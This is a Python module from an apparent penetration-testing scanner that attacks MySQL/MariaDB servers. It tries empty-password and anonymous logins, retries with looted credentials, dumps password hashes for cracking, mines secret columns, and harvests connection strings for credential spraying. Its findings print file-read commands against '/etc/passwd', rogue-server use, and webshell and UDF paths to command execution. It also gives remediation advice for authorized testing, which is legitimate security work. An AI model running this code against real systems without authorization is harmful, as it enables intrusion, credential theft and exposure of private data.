"""Deep MySQL/MariaDB enumeration (stdlib, read-only).

Reads the server handshake (version) and tests the highest-impact misconfiguration:
an account that logs in with an EMPTY password (classic `root` with no password, or an
anonymous ''@'%' account). We speak just enough of the MySQL protocol to send a
HandshakeResponse41 with a zero-length auth response and read the OK/ERR - no query is
ever run, nothing is written.

Findings fold into the severity totals / Vulnerabilities sheet (source="mysql").
"""
from __future__ import annotations

import hashlib
import re
import socket
import struct

from ...core.models import Host, Port
from .base import recvn as _recvn, finding as _base_finding

_PORTS = (3306, 3307, 33060)
_DEFAULT_PORT = 3306
_TIMEOUT = 5.0
_MAX_PKT = 64 * 1024

# client capability flags
_CLIENT_LONG_PASSWORD = 0x00000001
_CLIENT_PROTOCOL_41 = 0x00000200
_CLIENT_SECURE_CONNECTION = 0x00008000
_CLIENT_PLUGIN_AUTH = 0x00080000
_CAPS = (_CLIENT_LONG_PASSWORD | _CLIENT_PROTOCOL_41
         | _CLIENT_SECURE_CONNECTION | _CLIENT_PLUGIN_AUTH)


def is_mysql(port: Port) -> bool:
    if not port.is_open:
        return False
    svc = (port.service or "").lower()
    return port.portid in _PORTS or "mysql" in svc or "mariadb" in svc


def _read_packet(sock: socket.socket):
    """Return (payload_bytes, seq) or (None, 0)."""
    hdr = _recvn(sock, 4)
    if len(hdr) < 4:
        return None, 0
    length = hdr[0] | (hdr[1] << 8) | (hdr[2] << 16)
    seq = hdr[3]
    return _recvn(sock, min(length, _MAX_PKT)), seq


def _server_version(payload: bytes) -> str:
    # payload: [protocol_version:1][server_version:null-terminated]...
    if not payload or payload[0] != 10:
        return ""
    end = payload.find(b"\x00", 1)
    if end < 0:
        return ""
    return payload[1:end].decode("utf-8", "replace")


def _greeting(payload: bytes) -> dict:
    """Parse a MySQL/MariaDB server greeting (Handshake v10) for the capability flags
    and default auth plugin - read-only, no credentials. Returns {ssl, auth_plugin}."""
    out = {"ssl": False, "auth_plugin": "", "salt": b""}
    try:
        if not payload or payload[0] != 10:
            return out
        i0 = payload.find(b"\x00", 1)
        if i0 < 0:
            return out
        i0 += 1                                            # start of conn id
        auth1 = payload[i0 + 4:i0 + 12]                    # auth-plugin-data part 1 (8B)
        # part 2 sits after: conn(4)+auth1(8)+filler(1)+caplo(2)+charset(1)+status(2)
        #                    +caphi(2)+authlen(1)+reserved(10) = 31 bytes from i0
        auth2 = payload[i0 + 31:i0 + 31 + 12]              # part 2 (12B incl trailing NUL)
        out["salt"] = (auth1 + auth2).rstrip(b"\x00")[:20]
        i = i0 + 4 + 8 + 1                                 # conn id + auth1 + filler
        if i + 2 > len(payload):
            return out
        cap_lo = struct.unpack_from("<H", payload, i)[0]
        i += 2 + 1 + 2                                     # cap_lo + charset + status
        cap_hi = struct.unpack_from("<H", payload, i)[0] if i + 2 <= len(payload) else 0
        caps = cap_lo | (cap_hi << 16)
        out["ssl"] = bool(caps & 0x00000800)               # CLIENT_SSL
        # auth plugin name is the last NUL-terminated string when CLIENT_PLUGIN_AUTH set.
        if caps & 0x00080000:
            end = payload.rfind(b"\x00")
            start = payload.rfind(b"\x00", 0, end) + 1 if end > 0 else -1
            if 0 < start < end:
                cand = payload[start:end].decode("ascii", "replace")
                if cand.endswith("_password") or "sha2" in cand or "socket" in cand:
                    out["auth_plugin"] = cand
    except (struct.error, IndexError):
        pass
    return out


def _handshake_response(user: str) -> bytes:
    # HandshakeResponse41 with an EMPTY auth response (empty password).
    body = struct.pack("<IIB", _CAPS, _MAX_PKT, 0x21)      # caps, max packet, utf8 charset
    body += b"\x00" * 23                                   # reserved
    body += user.encode() + b"\x00"                        # username
    body += b"\x00"                                        # auth-response length = 0 (empty)
    body += b"mysql_native_password\x00"                   # auth plugin name
    return body


def _native_scramble(password: str, salt: bytes) -> bytes:
    """mysql_native_password: SHA1(pw) XOR SHA1(salt + SHA1(SHA1(pw)))."""
    if not password:
        return b""
    p1 = hashlib.sha1(password.encode()).digest()
    p2 = hashlib.sha1(p1).digest()
    p3 = hashlib.sha1(salt[:20] + p2).digest()
    return bytes(a ^ b for a, b in zip(p1, p3))


def _handshake_response_auth(user: str, password: str, salt: bytes) -> bytes:
    """HandshakeResponse41 carrying a mysql_native_password scramble for `password`."""
    token = _native_scramble(password, salt)
    body = struct.pack("<IIB", _CAPS, _MAX_PKT, 0x21)
    body += b"\x00" * 23
    body += user.encode() + b"\x00"
    body += bytes([len(token)]) + token
    body += b"mysql_native_password\x00"
    return body


def _login(ip: str, port: int, user: str, password: str | None, timeout: float):
    """Connect + authenticate (empty or native-password). Returns an authenticated
    socket ready for _query, or None. `password` None/"" uses the empty-password path."""
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock.settimeout(timeout)
    except OSError:
        return None
    try:
        payload, seq = _read_packet(sock)
        if not payload or payload[0] != 10:
            sock.close()
            return None
        if password:
            g = _greeting(payload)
            resp = _handshake_response_auth(user, password, g.get("salt") or b"")
        else:
            resp = _handshake_response(user)
        sock.sendall(struct.pack("<I", len(resp))[:3] + bytes([seq + 1]) + resp)
        reply, _ = _read_packet(sock)
        if not reply or reply[0] != 0x00:        # not an OK packet
            sock.close()
            return None
        return sock
    except OSError:
        try:
            sock.close()
        except OSError:
            pass
        return None


def authenticate(ip: str, port: int, user: str, password: str,
                 timeout: float = _TIMEOUT) -> bool:
    """Try one credential (mysql_native_password). Returns True if it logs in."""
    sock = _login(ip, port, user, password, timeout)
    if sock is None:
        return False
    try:
        return True
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _login_empty(ip: str, port: int, user: str, timeout: float) -> dict:
    """Attempt an empty-password login. Returns {reachable, version, ok, err}."""
    res = {"reachable": False, "version": "", "ok": False, "err": "",
           "ssl": False, "auth_plugin": ""}
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock.settimeout(timeout)
    except OSError as e:
        res["err"] = str(e)
        return res
    try:
        payload, seq = _read_packet(sock)
        if payload is None:
            res["err"] = "no handshake"
            return res
        if payload[:1] == b"\xff":                         # server greeted with an error
            res["reachable"] = True
            res["err"] = "server error on connect (host blocked?)"
            return res
        res["reachable"] = True
        res["version"] = _server_version(payload)
        g = _greeting(payload)
        res["ssl"], res["auth_plugin"] = g["ssl"], g["auth_plugin"]
        resp = _handshake_response(user)
        sock.sendall(struct.pack("<I", len(resp))[:3] + bytes([seq + 1]) + resp)
        reply, _ = _read_packet(sock)
        if not reply:
            res["err"] = "no login reply"
        elif reply[0] == 0x00:                             # OK packet
            res["ok"] = True
        elif reply[0] == 0xFF:                             # ERR packet
            code = struct.unpack("<H", reply[1:3])[0] if len(reply) >= 3 else 0
            res["err"] = f"ERR {code}"
        else:                                              # AuthSwitch(0xFE)/MoreData(0x01)
            res["err"] = "auth negotiation required"
        return res
    except OSError as e:
        res["err"] = str(e)
        return res
    finally:
        try:
            sock.close()
        except OSError:
            pass


def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
    res = {"reachable": False, "unauth": False, "auth_required": False,
           "version": "", "user": "", "error": "", "ssl": False, "auth_plugin": ""}
    for user in ("root", ""):                              # empty-password root, then anon
        r = _login_empty(ip, port, user, timeout)
        if r["reachable"]:
            res["reachable"] = True
            res["version"] = res["version"] or r["version"]
            res["ssl"] = res["ssl"] or r.get("ssl", False)
            res["auth_plugin"] = res["auth_plugin"] or r.get("auth_plugin", "")
        if r["ok"]:
            res["unauth"] = True
            res["user"] = user or "<anonymous>"
            return res
        if not r["reachable"]:
            res["error"] = r["err"]
            return res
    res["auth_required"] = True
    return res


def _lenenc_int(buf: bytes, off: int):
    b = buf[off]
    if b < 0xFB:
        return b, off + 1
    if b == 0xFC:
        return int.from_bytes(buf[off + 1:off + 3], "little"), off + 3
    if b == 0xFD:
        return int.from_bytes(buf[off + 1:off + 4], "little"), off + 4
    if b == 0xFE:
        return int.from_bytes(buf[off + 1:off + 9], "little"), off + 9
    return 0, off + 1


def _lenenc_str(buf: bytes, off: int):
    if off >= len(buf):
        return "", off
    if buf[off] == 0xFB:                         # NULL
        return None, off + 1
    n, off = _lenenc_int(buf, off)
    return buf[off:off + n].decode("utf-8", "replace"), off + n


def _is_eof(payload: bytes) -> bool:
    return payload[:1] == b"\xfe" and len(payload) < 9


def _query(sock: socket.socket, sql: str) -> list[list]:
    """COM_QUERY -> parsed rows (list of list of str|None). Read-only, no CLIENT_DEPRECATE_EOF
    so column defs are terminated by an EOF packet."""
    pkt = b"\x03" + sql.encode()                 # 0x03 = COM_QUERY
    sock.sendall(struct.pack("<I", len(pkt))[:3] + b"\x00" + pkt)
    first, _ = _read_packet(sock)
    if not first or first[:1] in (b"\x00", b"\xff"):     # OK / ERR -> no result set
        return []
    ncol, _ = _lenenc_int(first, 0)
    for _ in range(min(ncol, 512)):              # skip column-definition packets
        _read_packet(sock)
    after_cols, _ = _read_packet(sock)           # EOF after columns
    rows: list[list] = []
    pending = None if (after_cols is None or _is_eof(after_cols)) else after_cols
    for _ in range(100000):
        p = pending or (_read_packet(sock)[0])
        pending = None
        if p is None or _is_eof(p) or p[:1] == b"\xff":
            break
        off, row = 0, []
        for _c in range(ncol):
            v, off = _lenenc_str(p, off)
            row.append(v)
        rows.append(row)
    return rows


def loot(ip: str, port: int, user: str = "root", timeout: float = _TIMEOUT,
         password: str | None = None) -> dict:
    """Authenticated (empty-password or credentialed) -> read-only loot: the user table
    (password HASHES), the database list, and the connected account's FILE / privesc
    capability (FILE grant, secure_file_priv, plugin_dir). SELECT only."""
    out = {"users": [], "databases": [], "hashes": [], "current_user": "",
           "file_priv": False, "secure_file_priv": None, "plugin_dir": "", "os": ""}
    sock = _login(ip, port, user, password, timeout)
    if sock is None:
        return out
    try:
        for r in _query(sock, "SELECT user, host, authentication_string, plugin "
                              "FROM mysql.user"):
            u, host, ash, plugin = (r + [None] * 4)[:4]
            out["users"].append({"user": u, "host": host, "plugin": plugin})
            if ash:
                out["hashes"].append({"user": u, "host": host, "hash": ash, "plugin": plugin})
        out["databases"] = [r[0] for r in _query(sock, "SHOW DATABASES")]
        # Privesc surface: FILE grant + where files can be read/written + plugin dir (UDF).
        # @@local_infile is the SERVER-SIDE toggle that allows LOAD DATA LOCAL —
        # when a compromised app connects with a client that sets local_infile=1,
        # a hostile server (or an SQLi that forces the client into a fake-server
        # exchange) can read arbitrary files from the APP HOST. That is why
        # MySQL 8.0 flipped this to OFF by default. Whether the server allows
        # it is scanner-visible via @@local_infile.
        srv = _query(sock, "SELECT CURRENT_USER(), @@secure_file_priv, @@plugin_dir, "
                           "@@version_compile_os, @@local_infile")
        if srv and srv[0]:
            row = (srv[0] + [None] * 5)[:5]
            out["current_user"] = row[0] or ""
            out["secure_file_priv"] = row[1]           # NULL=disabled, ''=anywhere, path=limited
            out["plugin_dir"] = row[2] or ""
            out["os"] = row[3] or ""
            # @@local_infile arrives as 1/0 or ON/OFF depending on the row shape.
            v = str(row[4] or "").lower()
            out["local_infile"] = v in ("1", "on", "true", "yes")
        grants = _query(sock, "SHOW GRANTS")
        blob = " ".join(g[0] for g in grants if g and g[0]).upper()
        out["file_priv"] = ("FILE" in blob) or ("ALL PRIVILEGES" in blob and "*.*" in blob)
    except OSError:
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return out


def datamine(ip: str, port: int, dbs: list[str], timeout: float = _TIMEOUT,
             user: str = "root", password: str | None = None,
             max_dbs: int = 6, max_tables: int = 10, max_rows: int = 3) -> dict:
    """Read-only secret hunting: sensitive columns across the accessible databases,
    REDACTED row samples, and harvested connection strings. SELECT only."""
    from .postgres import _CONNSTR, _SECRET_COL, _redact
    out = {"secret_columns": [], "samples": [], "harvested": []}
    sock = _login(ip, port, user, password, timeout)
    if sock is None:
        return out
    try:
        sysdb = ("information_schema", "performance_schema", "mysql", "sys")
        rows = _query(
            sock, "SELECT table_schema, table_name, column_name "
            "FROM information_schema.columns "
            "WHERE table_schema NOT IN ('information_schema','performance_schema',"
            "'mysql','sys') ORDER BY 1,2")
        secret_tables: dict = {}
        for r in rows:
            if len(r) < 3 or r[2] is None or r[0] in sysdb:
                continue
            sch, tbl, col = r[0], r[1], r[2]
            if _SECRET_COL.search(col):
                out["secret_columns"].append(
                    {"db": sch, "table": f"{sch}.{tbl}", "column": col})
                secret_tables.setdefault((sch, tbl), []).append(col)
        for (sch, tbl), scols in list(secret_tables.items())[:max_tables]:
            ident = f"`{sch}`.`{tbl}`".replace("\x00", "")
            collist = ", ".join("`" + c.replace("`", "``") + "`" for c in scols[:6])
            data = _query(sock, f"SELECT {collist} FROM {ident} LIMIT {max_rows}")
            if not data:
                continue
            out["samples"].append({
                "db": sch, "table": f"{sch}.{tbl}", "columns": scols[:6],
                "rows": [[_redact(v) for v in row] for row in data]})
            for row in data:
                for v in row:
                    for m in _CONNSTR.finditer(str(v or "")):
                        out["harvested"].append(m.group(0))
    except OSError:
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass
    seen: set = set()
    out["harvested"] = [c for c in out["harvested"]
                        if not (c in seen or seen.add(c))]
    return out


def mysql_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_mysql(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
    return _base_finding("mysql", sev, title, target, detail, cmd, rem, cwes, kind)


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_mysql(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr:
                continue
            tgt = f"{h.ip}:{p.portid}"
            if pr.get("unauth"):
                who = pr.get("user") or "root"
                ver = pr.get("version") or ""
                lt = pr.get("loot") or {}
                loot_txt = ""
                if lt:
                    dbs = [d for d in lt.get("databases", [])
                           if d not in ("information_schema", "performance_schema", "sys", "mysql")]
                    hashes = lt.get("hashes", [])
                    loot_txt = (
                        f"\n\nLOOTED (read-only): {len(lt.get('users', []))} account(s), "
                        f"{len(lt.get('databases', []))} database(s)"
                        + (f" (non-system: {', '.join(dbs[:8])})" if dbs else "")
                        + (f"; {len(hashes)} password hash(es) captured (hashcat -m 300) -> "
                           + ", ".join(f"{h['user']}@{h['host']}" for h in hashes[:6])
                           if hashes else ""))
                plug = f"; default auth plugin {pr['auth_plugin']}" if pr.get("auth_plugin") else ""
                out.append(_finding(
                    "high", f"MySQL '{who}' login with empty password", tgt,
                    f"The account '{who}' authenticated with an EMPTY password"
                    + (f" (server {ver})" if ver else "") + plug
                    + " - full database access without a credential." + loot_txt,
                    f"mysql -h {h.ip} -P {p.portid} -u {who or 'root'}",
                    "Set a strong password on every account (esp. root); remove anonymous "
                    "''@'%' accounts; bind to localhost / a private interface.",
                    ["CWE-521", "CWE-306"], kind="mysql_empty_password"))
            elif pr.get("cred_access"):
                who = pr.get("cred_user", "?")
                ver = pr.get("version") or ""
                out.append(_finding(
                    "high", "MySQL credentialed access (looted / weak credential)", tgt,
                    f"recce logged in as '{who}' with a credential from the engagement"
                    + (f" (server {ver})" if ver else "")
                    + ". The account has database access.",
                    f"mysql -h {h.ip} -P {p.portid} -u {who} -p",
                    "Rotate the credential; enforce least privilege; bind to a trusted "
                    "interface.",
                    ["CWE-522", "CWE-284"], kind="mysql_cred_access"))
            lt = pr.get("loot") or {}

            # @@local_infile ON allows LOAD DATA LOCAL against consenting clients.
            # The exposure is on the APP HOST — an SQLi that steers the app into
            # a fake-server exchange reads files off the app server, not the DB.
            # MySQL 8.0 defaulted this OFF for a reason; recce reports when the
            # server still allows it so the tester can pair this finding with a
            # SQLi surface in the app.
            if lt.get("local_infile"):
                # NOTE: mysql._finding takes 7 positionals (no `tool` — the
                # tool string is folded into cmd here). This is different from
                # the msrpc/winrm shape, so keep the argument list to 7 or the
                # kind= kwarg lands on cmd positionally.
                out.append(_finding(
                    "medium",
                    "MySQL server allows LOAD DATA LOCAL (client-file read chain)",
                    tgt,
                    f"@@local_infile is ON on {tgt}. Any client that connects "
                    "with local_infile=1 can be told by the server to send a "
                    "local file — so a compromised (or rogue) MySQL server "
                    "reads files from the APP HOST, and an SQLi that steers the "
                    "app into a fake-server exchange (mysql_ldi / RogueMySql) "
                    "does the same without server access. MySQL 8.0 defaulted "
                    "this OFF; still-ON is a pairing target for any web SQLi.",
                    # tool + example command (rogue-mysql-server or direct)
                    "# rogue-mysql-server: python3 rogue-mysql-server.py, then "
                    "trigger the app to connect. Direct with creds: "
                    f"mysql -h {h.ip} -P {p.portid} -u <u> --local-infile=1 "
                    "-e \"LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t\"",
                    "Set local_infile=0 in my.cnf (MySQL 8.0 default). Configure "
                    "app-side clients to disable local_infile in the driver.",
                    ["CWE-269", "CWE-284"], kind="mysql_local_infile"))

            # FILE privilege -> arbitrary file read/write, and (with a writable plugin
            # dir) UDF OS command execution as the mysql service account.
            if lt.get("file_priv"):
                who = pr.get("cred_user") or pr.get("user") or "root"
                sfp = lt.get("secure_file_priv")
                sfp_txt = ("secure_file_priv is EMPTY (read/write anywhere)"
                           if sfp == "" else
                           (f"secure_file_priv={sfp}" if sfp else
                            "secure_file_priv is NULL (file ops disabled)"))
                udf = ""
                if lt.get("plugin_dir"):
                    udf += f" plugin_dir={lt['plugin_dir']}"
                out.append(_finding(
                    "high", "MySQL FILE privilege (arbitrary file read/write -> RCE)", tgt,
                    f"The account '{lt.get('current_user') or who}' holds the FILE "
                    f"privilege - {sfp_txt}." + udf
                    + " LOAD_FILE() reads any file the mysql user can (/etc/passwd, "
                    "app configs, private keys); SELECT ... INTO OUTFILE writes a "
                    "webshell / cron / authorized_keys; a UDF dropped into a writable "
                    "plugin_dir gives OS command execution as the service account.",
                    f"mysql -h {h.ip} -P {p.portid} -u {who} -e "
                    "\"SELECT LOAD_FILE('/etc/passwd')\"   # then INTO OUTFILE / UDF (ROE)",
                    "Revoke FILE from application accounts; set secure_file_priv to a "
                    "dedicated dir (or NULL); run mysqld as an unprivileged user.",
                    ["CWE-732", "CWE-250"], kind="mysql_file_priv"))
            # Exfil: sensitive columns + redacted samples + harvested connection strings.
            dm = pr.get("datamine")
            if dm and dm.get("secret_columns"):
                cols = dm["secret_columns"]
                tables = sorted({c["table"] for c in cols})
                detail = (f"recce mined {len(cols)} sensitive column(s) across "
                          f"{len(tables)} table(s): "
                          + ", ".join(f"{c['table']}.{c['column']}" for c in cols[:12])
                          + (" …" if len(cols) > 12 else "") + ".")
                samples = dm.get("samples") or []
                if samples:
                    s = samples[0]
                    detail += ("\n\nSAMPLE (redacted) " + s["table"] + " ["
                               + ", ".join(s["columns"]) + "]: "
                               + " | ".join(", ".join(row) for row in s["rows"][:2]))
                harvested = dm.get("harvested") or []
                if harvested:
                    detail += (f"\n\nHARVESTED {len(harvested)} connection string(s) -> "
                               "spray set: "
                               + ", ".join(re.sub(r":[^:@/]+@", ":****@", c)
                                           for c in harvested[:5]))
                out.append(_finding(
                    "high", "MySQL sensitive data exposed (PII / secrets / credentials)",
                    tgt, detail,
                    f"mysql -h {h.ip} -P {p.portid} -u <u> -p -e "
                    "\"SELECT * FROM <db>.<table> LIMIT 20\"   # full data (ROE)",
                    "Encrypt sensitive columns; least-privilege the app account; remove "
                    "embedded credentials; restrict network access.",
                    ["CWE-200", "CWE-312"], kind="mysql_datamine"))
            # TLS not offered by the server -> credentials + queries cross the wire in
            # cleartext (sniffable / MITM). Only assert it when we actually parsed a
            # greeting (reachable), never as a guess.
            if pr.get("reachable") and pr.get("version") and not pr.get("ssl"):
                out.append(_finding(
                    "medium", "MySQL does not offer TLS (credential sniffing)", tgt,
                    "The server greeting advertised no CLIENT_SSL capability - the "
                    "handshake, credentials and queries traverse the network unencrypted.",
                    f"mysql -h {h.ip} -P {p.portid} --ssl-mode=REQUIRED   # fails = no TLS",
                    "Enable TLS (require_secure_transport=ON) and install a server "
                    "certificate; bind to a trusted interface.",
                    ["CWE-319"], kind="mysql_no_tls"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [{"step": "Test empty-password root / anonymous login",
             "cmd": f"mysql -h {ip} -P {port} -u root   ;   mysql -h {ip} -P {port} -u ''"},
            {"step": "If in: read users + hashes",
             "cmd": "SELECT user,host,authentication_string FROM mysql.user;"}]


def findings_to_vulns(fs: list[dict]) -> dict:
    from ..svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "mysql", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from .. import svcprobe
    targets = mysql_targets(hosts)
    probes: dict = {}
    state: dict = {}
    looted: list = []
    if active:
        from ...core.models import Credential
        from .base import cred_list as _cred_list
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["unauth"] = pr.get("unauth", False)
                t["auth_required"] = pr.get("auth_required", False)
                t["version"] = pr.get("version", "") or t.get("version", "")
                acc_user, acc_pw, note = None, None, ""
                if pr.get("unauth"):
                    acc_user, acc_pw = pr.get("user") or "root", None
                    note = "empty-password"
                elif pr.get("auth_required"):
                    # Credentialed follow-through: try supplied/looted credentials.
                    for u, pw in _cred_list(creds):
                        if authenticate(t["ip"], t["port"], u, pw):
                            pr["cred_access"] = True
                            pr["cred_user"] = u
                            t["cred_access"] = True
                            acc_user, acc_pw, note = u, pw, f"credentialed ({u})"
                            break
                if acc_user is not None:
                    lt = loot(t["ip"], t["port"], user=acc_user, password=acc_pw)
                    pr["loot"] = lt
                    for hh in lt.get("hashes", []):
                        looted.append(Credential(
                            username=hh["user"] or "", secret=hh["hash"],
                            kind="hash", source="mysql-loot", origin_ip=t["ip"],
                            notes=f"mysql.user hash ({hh.get('plugin')}) from {note} "
                                  f"MySQL :{t['port']} - hashcat -m 300"))
                    dm = datamine(t["ip"], t["port"], lt.get("databases", []),
                                  user=acc_user, password=acc_pw)
                    pr["datamine"] = dm
                    for cs in dm.get("harvested", []):
                        looted.append(Credential(
                            username="(embedded)", secret=cs, kind="password",
                            source="mysql-datamine", origin_ip=t["ip"],
                            notes=f"connection string mined from MySQL :{t['port']}"))
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "credentials": looted,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "credentials": len(looted), "stopped": state.get("stopped")}}
